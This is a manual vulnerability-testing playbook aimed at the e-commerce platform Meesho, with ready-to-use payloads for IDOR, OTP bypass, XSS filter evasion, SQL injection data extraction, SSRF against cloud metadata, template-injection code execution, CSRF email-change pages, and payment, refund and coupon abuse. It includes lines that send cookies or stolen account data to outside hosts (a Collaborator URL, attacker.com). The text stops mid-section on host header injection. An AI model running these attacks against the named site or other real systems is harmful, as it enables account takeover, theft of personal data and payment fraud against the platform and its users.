# Meesho Deep Scan Playbook — Manual Vulnerability Testing

> **IMPORTANT:** All testing is MANUAL via Burp Suite. No automated scanners.  
> This playbook covers **every vulnerability class** in depth with exact payloads, techniques, and verification steps.

---

## Table of Contents

1. [Pre-Scan Setup](#1-pre-scan-setup)
2. [IDOR — Insecure Direct Object Reference](#2-idor--insecure-direct-object-reference)
3. [Broken Authentication](#3-broken-authentication)
4. [Broken Access Control](#4-broken-access-control)
5. [Cross-Site Scripting (XSS)](#5-cross-site-scripting-xss)
6. [SQL Injection](#6-sql-injection)
7. [Server-Side Request Forgery (SSRF)](#7-server-side-request-forgery-ssrf)
8. [Server-Side Template Injection (SSTI)](#8-server-side-template-injection-ssti)
9. [Cross-Site Request Forgery (CSRF)](#9-cross-site-request-forgery-csrf)
10. [Business Logic Vulnerabilities](#10-business-logic-vulnerabilities)
11. [Race Conditions](#11-race-conditions)
12. [Open Redirect](#12-open-redirect)
13. [CORS Misconfiguration](#13-cors-misconfiguration)
14. [CRLF Injection](#14-crlf-injection)
15. [HTTP Request Smuggling](#15-http-request-smuggling)
16. [Host Header Injection](#16-host-header-injection)
17. [JWT Vulnerabilities](#17-jwt-vulnerabilities)
18. [GraphQL Vulnerabilities](#18-graphql-vulnerabilities)
19. [File Upload Vulnerabilities](#19-file-upload-vulnerabilities)
20. [Path Traversal / LFI](#20-path-traversal--lfi)
21. [XXE — XML External Entity](#21-xxe--xml-external-entity)
22. [Command Injection](#22-command-injection)
23. [Subdomain Takeover](#23-subdomain-takeover)
24. [Information Disclosure](#24-information-disclosure)
25. [Security Headers & TLS](#25-security-headers--tls)
26. [Mobile Application Testing](#26-mobile-application-testing)
27. [API-Specific Vulnerabilities](#27-api-specific-vulnerabilities)
28. [Web Cache Poisoning](#28-web-cache-poisoning)
29. [WebSocket Vulnerabilities](#29-websocket-vulnerabilities)
30. [OAuth / SSO Vulnerabilities](#30-oauth--sso-vulnerabilities)

---

## 1. Pre-Scan Setup

### Environment Checklist

```
[ ] Burp Suite Community/Pro installed
[ ] Browser proxy → 127.0.0.1:8080
[ ] Burp CA cert installed in browser
[ ] FoxyProxy extension installed
[ ] Account A created on Meesho (email + phone)
[ ] Account B created on Meesho (different email + phone)
[ ] Notepad/text editor ready for documentation
[ ] Screenshot tool ready (ShareX, Greenshot, or Snipping Tool)
[ ] curl installed for manual tests
[ ] Browser DevTools open (F12)
```

### Burp Suite Configuration

1. **Proxy → Options:** Listener on `127.0.0.1:8080`
2. **Target → Scope:** Add `*.meesho.com` to scope
3. **Proxy → Options → Intercept Client Requests:** Only intercept in-scope requests
4. **Logger → Capture:** Enable to log all traffic
5. **Comparer:** Keep Burp Comparer ready for response diff comparisons

### Application Mapping (Do This First!)

1. Turn Intercept OFF
2. Login as Account A
3. Navigate through EVERY feature:
   ```
   Home → Search → Product page → Add to cart → Cart → Checkout
   Profile → Edit profile → Change address → View orders → Order details
   Wishlist → Add/remove items
   Settings → Notifications → Privacy
   Support/Help → Submit ticket
   Referral → Share link
   Seller dashboard (if accessible)
   ```
4. In Burp, go to **Target → Site Map**
5. **Document every unique endpoint** — group by category:
   ```
   AUTH:     /api/v*/auth/login, /api/v*/auth/register, /api/v*/auth/otp, ...
   USER:     /api/v*/users/{id}, /api/v*/users/{id}/profile, ...
   ORDER:    /api/v*/orders/{id}, /api/v*/orders/list, ...
   PRODUCT:  /api/v*/products/{id}, /api/v*/products/search, ...
   CART:     /api/v*/cart, /api/v*/cart/items/{id}, ...
   PAYMENT:  /api/v*/payments/{id}, /api/v*/payments/initiate, ...
   ADDRESS:  /api/v*/addresses/{id}, /api/v*/addresses/list, ...
   ```

---

## 2. IDOR — Insecure Direct Object Reference

### Severity: High to Critical
### What: Accessing/modifying another user's resources by changing an identifier.

### 2.1 Identify All Endpoints with IDs

From your Site Map, list every endpoint containing:
- Numeric IDs: `/orders/12345`
- UUIDs: `/users/550e8400-e29b-41d4-a716-446655440000`
- Encoded IDs: `/item/YWJjMTIz` (base64)
- Hashed IDs: `/profile/5d41402abc4b2a76b9719d911017c592`

### 2.2 Test Methodology

**For each endpoint with an ID:**

```
Step 1: Login as Account A
Step 2: Perform the action, capture request in Burp
Step 3: Note the ID value (e.g., order_id=1001)
Step 4: Login as Account B
Step 5: Perform same action, note ID (e.g., order_id=2002)
Step 6: In Repeater, send Account A's request but with Account B's auth token
        → Does it return Account A's data? (horizontal IDOR)
Step 7: In Repeater, send Account B's request but with Account A's ID (1001)
        → Does it return Account A's data? (horizontal IDOR)
Step 8: Try with no auth header at all
        → Does it return data? (broken auth)
```

### 2.3 ID Manipulation Techniques

```
Original ID: 1001

Try:
  1001 → 1002 (increment)
  1001 → 1000 (decrement)
  1001 → 0
  1001 → -1
  1001 → 999999999 (large number)
  1001 → 1001,1002 (array)
  1001 → [1001,1002] (JSON array)
  1001 → {"id": 1002} (JSON object)
  1001 → 1001%00 (null byte)
```

**For UUIDs:**
```
Swap entire UUID between Account A and B
Try nil UUID: 00000000-0000-0000-0000-000000000000
```

**For Base64 IDs:**
```
echo "YWJjMTIz" | base64 -d   → "abc123"
Modify the decoded value → re-encode → send
echo "abc124" | base64          → "YWJjMTI0"
```

### 2.4 HTTP Method IDOR

```
If GET /api/orders/1001 is protected:
  Try POST /api/orders/1001
  Try PUT /api/orders/1001
  Try PATCH /api/orders/1001
  Try DELETE /api/orders/1001
  
Sometimes write operations lack the auth check that read has.
```

### 2.5 Parameter Pollution IDOR

```
GET /api/orders?id=1001               → Normal
GET /api/orders?id=1001&id=1002       → Parameter pollution
GET /api/orders?id[]=1001&id[]=1002   → Array injection
POST /api/orders {"id": 1001, "id": 1002}  → Duplicate key
```

### 2.6 Endpoint-Specific Tests

| Endpoint Pattern | What Leaks | Severity |
|-----------------|------------|----------|
| `/orders/{id}` | Name, address, phone, order items | Critical |
| `/users/{id}/profile` | PII, email, phone | Critical |
| `/addresses/{id}` | Full address, name, phone | Critical |
| `/payments/{id}` | Payment details, partial card | Critical |
| `/invoices/{id}` | Financial data | High |
| `/reviews/{id}` | User activity | Medium |
| `/wishlist/{id}` | User preferences | Low |
| `/cart/{id}` | Shopping behavior | Low |

### 2.7 Verification

An IDOR is confirmed when:
- ✅ Account B's token returns Account A's data
- ✅ You see data belonging to another user
- ✅ You can modify/delete another user's resource

---

## 3. Broken Authentication

### Severity: High to Critical

### 3.1 OTP Bypass — Full Test Suite

#### 3.1.1 Brute Force OTP
```
1. Request OTP for your account
2. Send OTP verification request to Burp Intruder
3. Set OTP field as payload position
4. Payload type: Numbers, 0000-9999 (4-digit) or 000000-999999 (6-digit)
5. If no rate limiting → OTP can be brute-forced → Critical
6. Even if rate limited, check:
   - Does rate limit reset after X minutes?
   - Does rate limit apply per IP or per account?
   - Can you bypass with X-Forwarded-For header?
```

#### 3.1.2 OTP in Response
```
1. Request OTP
2. Check response body carefully — sometimes OTP is leaked:
   {"status": "sent", "otp": "1234"}    ← Obviously leaked
   {"status": "sent", "debug": "1234"}  ← Debug mode
   {"token": "base64_containing_otp"}   ← Check decoded value
3. Check response headers for any OTP leakage
```

#### 3.1.3 OTP Reuse
```
1. Request OTP → receive code 1234
2. Use it successfully → login
3. Logout
4. Try using the same OTP 1234 again → does it work?
5. If yes → OTP not invalidated after use
```

#### 3.1.4 OTP for Different Account
```
1. Request OTP for Account A (phone: +91-AAAAAAAAAA)
2. Intercept the verification request
3. Change phone number to Account B's (phone: +91-BBBBBBBBBB)
4. Send Account A's OTP for Account B's number
5. If it works → account takeover
```

#### 3.1.5 Response Manipulation
```
1. Enter wrong OTP
2. Server returns: {"success": false, "message": "Invalid OTP"}
3. Intercept this response in Burp (Intercept Response)
4. Change to: {"success": true, "message": "Valid OTP"}
5. Forward the modified response
6. Does the app accept it? → Client-side validation only
```

#### 3.1.6 Null/Empty OTP
```
Try these values for OTP:
  (empty string)
  null
  0
  000000
  true
  undefined
  []
  {}
  "null"
```

#### 3.1.7 Rate Limit Bypass
```
Try these headers to bypass IP-based rate limiting:
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Original-Forwarded-For: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  True-Client-IP: 127.0.0.1
  CF-Connecting-IP: 127.0.0.1
  X-Client-IP: 127.0.0.1

Change the IP value for each request:
  X-Forwarded-For: 1.1.1.1
  X-Forwarded-For: 1.1.1.2
  ...
```

### 3.2 Password Reset Vulnerabilities

#### 3.2.1 Token Analysis
```
1. Request password reset 3 times
2. Collect the 3 reset tokens/links
3. Analyze:
   - Are they sequential?
   - Do they contain timestamps?
   - What's the token length? (Short = guessable)
   - Are they UUID v1? (Contains timestamp + MAC address)
```

#### 3.2.2 Token Manipulation
```
1. Request reset for Account A → get token AAAA
2. Request reset for Account B → get token BBBB
3. Try using token AAAA on Account B's reset page
4. Try modifying token AAAA slightly → does it work?
```

#### 3.2.3 Host Header Poisoning on Reset
```
POST /api/auth/password-reset
Host: evil.com                    ← Poisoned host

If the reset email contains a link like:
  https://evil.com/reset?token=abc123
→ The token is sent to your server → Account Takeover
```

#### 3.2.4 Password Reset Persistence
```
1. Request reset → get token
2. Change password using the token
3. Try using the SAME token again → does it still work?
4. If yes → token not invalidated → can be reused
```

### 3.3 Session Management

```
Test 1: Logout Invalidation
  1. Login → copy session token
  2. Logout
  3. Use old token in Burp → does it still work?
  
Test 2: Concurrent Sessions
  1. Login on Browser 1
  2. Login on Browser 2
  3. Are both sessions active?
  4. Logout on Browser 1 → does Browser 2's session die?

Test 3: Session After Password Change
  1. Login → copy token
  2. Change password
  3. Use old token → should be invalidated

Test 4: Session Fixation
  1. Before login, note session cookie
  2. Login
  3. Does session cookie change? If same → session fixation

Test 5: Token Entropy
  1. Collect 10+ session tokens
  2. Check randomness (use Burp Sequencer → right-click token → Send to Sequencer)
```

---

## 4. Broken Access Control

### 4.1 Vertical Privilege Escalation

```
1. Identify roles: buyer, seller, admin, support
2. Login as buyer → capture all API requests
3. Look for seller-only endpoints:
   /api/seller/dashboard
   /api/seller/products
   /api/seller/orders
   /api/seller/analytics
   /api/seller/payouts
   /api/admin/*
   /api/internal/*

4. Try accessing these with buyer's token
5. If accessible → vertical privilege escalation
```

### 4.2 Forced Browsing

```
Try accessing directly:
  /admin
  /admin/login
  /dashboard
  /internal
  /api/admin/users
  /api/internal/stats
  /api/v1/admin/config
  /management
  /console
  /debug
  /actuator
  /actuator/env
  /actuator/health
  /actuator/beans
```

### 4.3 Role Manipulation

```
1. Capture profile update request:
   PUT /api/users/me
   {"name": "Test User"}

2. Add role parameters:
   {"name": "Test User", "role": "admin"}
   {"name": "Test User", "role": "seller"}
   {"name": "Test User", "is_admin": true}
   {"name": "Test User", "user_type": "admin"}
   {"name": "Test User", "permissions": ["admin"]}
   {"name": "Test User", "group": "administrators"}
```

### 4.4 HTTP Method Override

```
If PUT /api/admin/config returns 403:
  Try: POST /api/admin/config with X-HTTP-Method-Override: PUT
  Try: POST /api/admin/config with X-Method-Override: PUT
  Try: POST /api/admin/config?_method=PUT
```

### 4.5 Path Traversal in URLs

```
If /api/v1/users/me returns your data:
  Try: /api/v1/users/me/../admin
  Try: /api/v1/users/./me
  Try: /api/v1/users/me%2f..%2fadmin
  Try: /api/v1/users/me;admin
  Try: /api/v1/users/me%00admin
```

---

## 5. Cross-Site Scripting (XSS)

### Severity: Medium to High

### 5.1 Find All Input Points

```
Category 1 — URL Parameters (Reflected XSS):
  - Search: /search?q=PAYLOAD
  - Filters: /products?category=PAYLOAD
  - Sort: /products?sort=PAYLOAD
  - Redirect: /login?redirect=PAYLOAD
  - Error pages: /404?page=PAYLOAD

Category 2 — Form Fields (Stored XSS):
  - Profile name
  - Profile bio/about
  - Shipping address (street, city, zip)
  - Product reviews/ratings
  - Support tickets
  - Chat messages
  - File names (during upload)

Category 3 — HTTP Headers (Header XSS):
  - User-Agent
  - Referer
  - Custom headers reflected in error pages
```

### 5.2 Payload Progression (Start Simple → Escalate)

#### Level 1: Detection
```html
<!-- Does the app reflect input at all? -->
test123uniquestring
<b>bold</b>
```
Check if `test123uniquestring` appears in the response. If `<b>bold</b>` renders as **bold**, HTML injection works.

#### Level 2: Basic XSS
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

#### Level 3: Event Handlers (bypass script tag filter)
```html
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
"><body onload=alert(1)>
"><input onfocus=alert(1) autofocus>
"><marquee onstart=alert(1)>
"><details open ontoggle=alert(1)>
"><video src=x onerror=alert(1)>
"><audio src=x onerror=alert(1)>
```

#### Level 4: Filter Bypass
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- No quotes/spaces -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- HTML encoding -->
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Double encoding -->
%253Csvg%2520onload%253Dalert(1)%253E

<!-- Null bytes -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Tab/newline -->
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>

<!-- JavaScript protocol -->
<a href="javascript:alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>
<a href="java%0ascript:alert(1)">click</a>
```

#### Level 5: WAF Bypass
```html
<!-- String concatenation -->
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self['al'+'ert'](1)>
<img src=x onerror=top['al'+'ert'](1)>

<!-- Constructor -->
<img src=x onerror=[].constructor.constructor('alert(1)')()>

<!-- Using eval alternatives -->
<img src=x onerror=setTimeout('alert(1)')>
<img src=x onerror=setInterval('alert(1)')>
<img src=x onerror=Function('alert(1)')()>

<!-- Template literals -->
<img src=x onerror=alert`1`>

<!-- Fetch-based (no alert needed) -->
<img src=x onerror=fetch('https://YOUR-COLLABORATOR.burpcollaborator.net/'+document.cookie)>
```

#### Level 6: DOM-Based XSS
```
Check JavaScript source for dangerous sinks:
  document.write()
  document.writeln()
  element.innerHTML =
  element.outerHTML =
  eval()
  setTimeout()
  setInterval()
  location.href =
  location.assign()
  window.open()
  
Connected to sources:
  location.hash
  location.search
  document.referrer
  document.URL
  window.name
  postMessage data
```

**Test DOM XSS:**
```
https://meesho.com/page#<img src=x onerror=alert(1)>
https://meesho.com/page?param=<script>alert(1)</script>
```

### 5.3 Context-Specific Payloads

```html
<!-- Inside HTML attribute -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- Inside JavaScript string -->
';alert(1);//
"-alert(1)-"
\';alert(1);//

<!-- Inside JavaScript template literal -->
${alert(1)}

<!-- Inside HTML comment -->
--><script>alert(1)</script><!--

<!-- Inside CSS -->
</style><script>alert(1)</script>

<!-- JSON context -->
{"key":"value","x":"</script><script>alert(1)</script>"}
```

### 5.4 XSS Verification

When you get an alert:
1. Screenshot the alert box showing `document.domain`
2. Show the injected payload in page source (View Source)
3. Show the HTTP request that delivered the payload
4. For stored XSS: show it triggers in another user's session (Account B)

---

## 6. SQL Injection

### Severity: High to Critical

### 6.1 Detection Phase

**For each parameter, test these sequentially:**

```sql
-- Step 1: Check for errors
'
"
\
`
')
")

-- Step 2: Boolean-based detection
' AND '1'='1     (should return normal results — TRUE condition)
' AND '1'='2     (should return empty/different — FALSE condition)
1 AND 1=1        (numeric — TRUE)
1 AND 1=2        (numeric — FALSE)

-- Step 3: Time-based detection
' OR SLEEP(5)--           (MySQL — 5 second delay?)
' OR pg_sleep(5)--        (PostgreSQL)
' OR WAITFOR DELAY '0:0:5'-- (MSSQL)
'; SELECT SLEEP(5)--      (stacked)

-- Step 4: Union-based detection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
(keep adding NULL until no error — tells you column count)
```

### 6.2 Error Analysis

| Error Message | Database |
|--------------|----------|
| `You have an error in your SQL syntax` | MySQL |
| `Unclosed quotation mark` | MSSQL |
| `PSQLException` | PostgreSQL |
| `ORA-01756` | Oracle |
| `SQLite3::` | SQLite |

### 6.3 Data Extraction (After confirmation)

```sql
-- MySQL
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--

-- Extract version
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--

-- PostgreSQL
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

### 6.4 Blind SQLi (No Visible Output)

```sql
-- Boolean: Check if first character of database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--
' AND ASCII(SUBSTRING(database(),1,1))=109--

-- Time: If condition is true, delay 5 seconds
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- Out-of-band (needs Burp Collaborator):
' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.YOUR-COLLABORATOR.burpcollaborator.net\\a')))--
```

### 6.5 Where to Test

```
Search parameters:    /search?q='
Filter parameters:    /products?category='&sort=' 
Login fields:         username: admin'--  password: anything
API parameters:       POST /api/search {"query": "'"}
Cookies:              If cookie values are used in queries
Headers:              User-Agent, Referer (logged to DB?)
```

### 6.6 Filter Bypass

```sql
-- Space bypass
'/**/UNION/**/SELECT/**/NULL--
'+UNION+SELECT+NULL--
'%09UNION%09SELECT%09NULL--

-- Keyword bypass
' UNiOn SeLeCt NULL--
' /*!50000UNION*/ /*!50000SELECT*/ NULL--
' UNION ALL SELECT NULL--

-- Comment bypass
'--
'#
'/*
'; --
```

---

## 7. Server-Side Request Forgery (SSRF)

### Severity: High to Critical

### 7.1 Find SSRF Entry Points

```
Look for parameters that accept URLs:
  - Image/avatar upload by URL
  - PDF generation from URL
  - Link preview/unfurling
  - Webhook configuration
  - Import from URL
  - "Share via URL" features
  - Proxy/redirect features

Parameter names to look for:
  url=, uri=, path=, dest=, redirect=, src=, source=,
  link=, imageurl=, iconurl=, callback=, return=,
  feed=, host=, site=, html=, page=
```

### 7.2 Basic SSRF Payloads

```
# Internal IP addresses
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0

# AWS Metadata (if hosted on AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Internal services
http://127.0.0.1:8080
http://127.0.0.1:3000
http://127.0.0.1:6379    (Redis)
http://127.0.0.1:27017   (MongoDB)
http://127.0.0.1:9200    (Elasticsearch)
http://127.0.0.1:5432    (PostgreSQL)
```

### 7.3 SSRF Bypass Techniques

```
# IP obfuscation
http://0x7f000001            (hex)
http://2130706433            (decimal)
http://017700000001          (octal)
http://127.1                 (shortened)
http://127.0.0.1.nip.io     (DNS rebinding)

# URL tricks
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1%2523@evil.com

# Schema tricks
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a

# DNS rebinding
Use a service like rebind.it that alternates between your IP and 127.0.0.1

# Redirect-based
Host a page at your server that redirects to http://169.254.169.254/
```

### 7.4 Blind SSRF Detection

```
1. Use Burp Collaborator: replace URL with your Collaborator URL
2. Or use https://webhook.site — free external interaction catcher
3. If you get a hit from Meesho's server → blind SSRF confirmed
```

---

## 8. Server-Side Template Injection (SSTI)

### Severity: Critical (usually leads to RCE)

### 8.1 Detection

```
Test every input field that reflects your data:

Step 1: Math test
  {{7*7}}     → If you see 49 → Jinja2/Twig/etc.
  ${7*7}      → If you see 49 → Freemarker/Thymeleaf
  #{7*7}      → If you see 49 → Pug/Jade
  <%= 7*7 %>  → If you see 49 → ERB (Ruby)
  {{= 7*7}}   → If you see 49 → doT.js
  
Step 2: String test
  ${"test".toUpperCase()}   → TEST = Java EL
  {{config}}                → Config dump = Flask/Jinja2
  {{self}}                  → Memory address = Jinja2
```

### 8.2 Template Engine Fingerprinting

```
               {{7*7}} = 49?
              /           \
           Yes             No
            |               |
       {{7*'7'}} = ?    ${7*7} = 49?
      /          \       /         \
  '7777777'    '49'   Yes          No
     |           |      |           |
   Jinja2     Twig  Freemarker   #{7*7}?
                                  |
                                 EL/Pug
```

### 8.3 Exploitation (by engine)

```python
# Jinja2 (Python/Flask)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
# (X = index of subprocess.Popen)

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 9. Cross-Site Request Forgery (CSRF)

### Severity: Medium to High

### 9.1 Identify CSRF-Worthy Endpoints

Test ALL state-changing operations:
```
POST /api/users/me/email          (email change)
POST /api/users/me/phone          (phone change)
POST /api/users/me/password       (password change)
POST /api/addresses               (add address)
PUT  /api/addresses/{id}          (update address)
DELETE /api/addresses/{id}        (delete address)
POST /api/cart/items              (add to cart)
POST /api/orders                  (place order)
POST /api/payments/initiate       (start payment)
POST /api/support/ticket          (create ticket)
DELETE /api/users/me              (delete account)
```

### 9.2 Check CSRF Protections

```
For each request, check:
1. Is there a CSRF token? (in header, body, or cookie)
2. Remove the CSRF token → does request still work?
3. Use empty CSRF token → does it work?
4. Use CSRF token from different session → does it work?
5. Change request from POST to GET → does it work?
6. Remove Referer/Origin header → does it work?
7. Change Content-Type from application/json to application/x-www-form-urlencoded
```

### 9.3 CSRF PoC (Proof of Concept)

```html
<!-- Basic CSRF PoC -->
<html>
<body>
  <h1>Click here for free gift!</h1>
  <form action="https://meesho.com/api/users/me/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com"/>
    <input type="submit" value="Claim Gift"/>
  </form>
  <script>document.forms[0].submit();</script>  <!-- Auto-submit -->
</body>
</html>

<!-- JSON CSRF PoC (for APIs using application/json) -->
<html>
<body>
<script>
  fetch('https://meesho.com/api/users/me/email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: JSON.stringify({"email": "attacker@evil.com"})
  });
</script>
</body>
</html>
```

### 9.4 CSRF Token Bypass

```
1. Remove token entirely
2. Empty string token
3. Same length random string
4. Token from different user's session
5. Reuse old/expired token
6. Change HTTP method (POST→GET) which may skip validation
7. Remove Content-Type header
8. Change Content-Type to avoid triggering CORS preflight
```

---

## 10. Business Logic Vulnerabilities

### Severity: Medium to Critical

### 10.1 Price/Amount Manipulation

```
Step 1: Add product (₹500) to cart
Step 2: Proceed to checkout
Step 3: Intercept the order/payment request
Step 4: Look for these fields and modify:

{
  "product_id": "12345",
  "quantity": 1,          → Try: 0, -1, 0.001, 99999999
  "price": 500,           → Try: 0, 1, -500, 0.01
  "total": 500,           → Try: 0, 1, -1
  "discount": 0,          → Try: 500, 100, 99999
  "discount_percent": 0,  → Try: 100, 200, -100
  "shipping_fee": 50,     → Try: 0, -50
  "tax": 90,              → Try: 0, -90
  "coupon_value": 0       → Try: 500, 99999
}

Step 5: Does the backend recalculate or trust client values?
```

### 10.2 Coupon/Promo Abuse

```
Test 1: Apply same coupon twice
  → Apply coupon → intercept → replay the request

Test 2: Apply expired coupon
  → If you have old coupon codes, try them

Test 3: Coupon for different category
  → Apply electronics coupon on clothing

Test 4: Modify coupon discount value
  → Intercept apply-coupon response → change discount amount

Test 5: Coupon brute force
  → Try common patterns: MEESHO10, MEESHO20, FIRST50, WELCOME, etc.
  → Try sequential: COUPON001, COUPON002, etc.

Test 6: Remove coupon check from checkout
  → Add coupon → go to checkout → intercept and keep discount but remove coupon validation
```

### 10.3 Cart Manipulation

```
Test 1: Add item → change price → checkout
Test 2: Add out-of-stock item (modify availability check)
Test 3: Add item with quantity = 0 → negative total
Test 4: Mixed currency (if applicable)
Test 5: Add item → get discounted price → remove discount → keep price
Test 6: Max integer overflow: quantity = 2147483647
```

### 10.4 Payment Flow

```
Step 1: Map the full payment flow:
  1. Cart → Calculate total
  2. Initiate payment → Get payment_id
  3. Complete payment → Send callback/webhook
  4. Confirm order → Create order

Step 2: Try skipping steps:
  - Skip step 2 → go directly to step 4
  - Replay step 3 (old successful callback) for new order
  - Modify payment status in callback (failed → success)
  - Use payment_id from cheap order on expensive order
  - Complete checkout with ₹0 payment

Step 3: Double spend:
  - Complete payment → get order
  - Replay same payment callback → get another order?
```

### 10.5 Referral Abuse

```
Test 1: Self-referral
  → Use Account A's referral link on Account B (you own both)
  → Do you get the referral bonus?

Test 2: Multiple referrals
  → Can Account B be referred by both Account A and Account C?

Test 3: Referral before signup
  → Create account first → then use referral link → bonus without real referral?

Test 4: Modify referral reward
  → Intercept referral claim request → change reward amount
```

### 10.6 Refund/Return Abuse

```
Test 1: Place order → request refund → cancel refund cancellation
  → Has the refund already been processed?

Test 2: Place order → claim item not received (while it is in transit)
  → Get refund + keep item

Test 3: Modify refund amount in request
  → Change refund from ₹500 to ₹5000

Test 4: Return used/different item
  → Can the return be approved without physical verification?
```

---

## 11. Race Conditions

### Severity: Medium to High

### 11.1 Turbo Intruder Method (Burp Extension)

```python
# Install Turbo Intruder from Burp BApp Store
# Send the target request to Turbo Intruder
# Use this script:

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    table.add(req)
```

### 11.2 What to Race

```
1. Coupon application      → Apply same coupon 30x simultaneously
2. Money transfer/cashback → Claim reward 30x simultaneously  
3. Limited stock purchase  → Buy last item 30x simultaneously
4. Follow/like action      → Get multiple rewards for single action
5. Vote/rating             → Vote multiple times
6. Account creation bonus  → Claim signup bonus 30x
7. Referral reward         → Claim referral 30x
```

### 11.3 Detection

```
Send 30 identical requests simultaneously.
If you expect an action to happen ONCE but it happens MULTIPLE times:
  - Coupon discount applied 3x instead of 1x
  - Money added to wallet 5x instead of 1x
  - Stock went to -3 (oversold)
→ Race condition confirmed
```

---

## 12. Open Redirect

### Severity: Low to Medium

### 12.1 Find Redirect Parameters

```
URL parameters to look for:
  ?url=
  ?redirect=
  ?next=
  ?return=
  ?returnTo=
  ?return_url=
  ?redirect_uri=
  ?continue=
  ?dest=
  ?destination=
  ?go=
  ?out=
  ?forward=
  ?target=
  ?rurl=
  ?callback=
```

### 12.2 Payloads

```
# Basic
https://evil.com
http://evil.com

# Protocol-relative
//evil.com
///evil.com
////evil.com

# Backslash (Windows normalization)
/\evil.com
\/evil.com

# At-sign trick
https://meesho.com@evil.com

# Subdomain confusion
https://meesho.com.evil.com
https://evilmeesho.com

# URL encoding
https://evil%2Ecom
%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d

# Data URI
data:text/html,<script>alert(1)</script>

# JavaScript (escalates to XSS)
javascript:alert(1)
javascript://meesho.com/%0aalert(1)

# CRLF in redirect
%0d%0aLocation:%20https://evil.com
```

### 12.3 Where to Test

```
1. Login page → after login, where does it redirect?
   /login?redirect=PAYLOAD
   
2. Logout page → after logout redirect
   /logout?next=PAYLOAD

3. OAuth callback → redirect_uri parameter
   /oauth/callback?redirect_uri=PAYLOAD

4. Shortened URLs / go links
   /go?url=PAYLOAD
   /link?url=PAYLOAD
```

---

## 13. CORS Misconfiguration

### Severity: Medium to High

### 13.1 Test Cases

```bash
# Test 1: Reflected Origin
curl -s -I -H "Origin: https://evil.com" https://meesho.com/api/user/me
# VULNERABLE if response contains:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true

# Test 2: Null Origin
curl -s -I -H "Origin: null" https://meesho.com/api/user/me
# VULNERABLE if:
#   Access-Control-Allow-Origin: null

# Test 3: Subdomain match
curl -s -I -H "Origin: https://evil.meesho.com" https://meesho.com/api/user/me

# Test 4: Prefix match
curl -s -I -H "Origin: https://meesho.com.evil.com" https://meesho.com/api/user/me

# Test 5: Suffix match
curl -s -I -H "Origin: https://evilmeesho.com" https://meesho.com/api/user/me

# Test 6: Special characters
curl -s -I -H "Origin: https://meesho.com%60.evil.com" https://meesho.com/api/user/me
```

### 13.2 CORS Exploitation PoC

```html
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://meesho.com/api/user/me', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
  }
};
xhr.send();
</script>
</body>
</html>
```

---

## 14. CRLF Injection

### Severity: Medium

### 14.1 Payloads

```
# Header injection
%0d%0aSet-Cookie:evil=true
%0d%0aX-Injected:true
%0d%0a%0d%0a<script>alert(1)</script>

# Double encoding
%250d%250a

# Unicode
%E5%98%8A%E5%98%8D

# Test in:
- Redirect URLs
- Any parameter reflected in response headers
- Set-Cookie values
```

---

## 15. HTTP Request Smuggling

### Severity: High to Critical

### 15.1 Detection

```
# CL.TE detection
POST / HTTP/1.1
Host: meesho.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL detection
POST / HTTP/1.1
Host: meesho.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Time-based detection
# If one method causes a delay, it confirms the server setup
```

> **Caution:** Request smuggling can affect other users. Test carefully and document without exploiting.

---

## 16. Host Header Injection

### Severity: Medium to High

### 16.1 Payloads

```
# Basic
GET / HTTP/1.1
